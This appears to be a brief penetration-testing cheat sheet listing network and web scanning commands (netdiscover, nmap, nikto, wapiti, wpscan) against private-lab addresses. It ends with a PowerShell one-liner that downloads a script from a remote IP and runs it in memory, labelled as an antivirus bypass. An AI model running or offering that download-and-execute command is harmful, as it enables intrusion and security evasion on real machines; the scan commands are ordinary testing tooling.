# tools
few scripts and useful commands

# scan
netdiscover -r 192.168.10.130/24 \n
nmap -A -sS 192.168.10.135 \n
nikto -h http://192.168.10.135/site \n
wapiti http://192.168.10.134/site \n
wordpress : wpscan --url http://192.168.10.135/site \n

# windows
run ps1 script in memory (bypass antivirus) : powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')
